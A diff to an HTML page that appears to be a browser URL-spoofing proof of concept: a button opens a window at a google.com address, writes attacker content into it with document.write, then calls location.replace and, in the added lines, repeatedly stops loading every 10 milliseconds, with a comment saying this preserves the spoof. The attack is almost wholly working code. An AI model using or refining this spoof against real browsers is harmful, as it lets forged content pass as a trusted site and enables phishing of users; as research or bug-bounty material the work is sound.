@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="testRedirect()">CLICK aja </button>
+<button onclick="testRedirect()">CLICK </button>
 <script>
 function testRedirect() {
     let win = window.open("https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000");
@@ -14,8 +14,10 @@ function testRedirect() {
         '</div>';
     win.document.write(payload);
     win.document.close();
-        win.location.replace("https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000");
+    win.location.replace("https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000", "https://www.google.com:8000");
+    setInterval(function() {
         win.stop(win);
+    }, 10);  // Small interval to preserve the spoof
 }
 </script>
 </body>
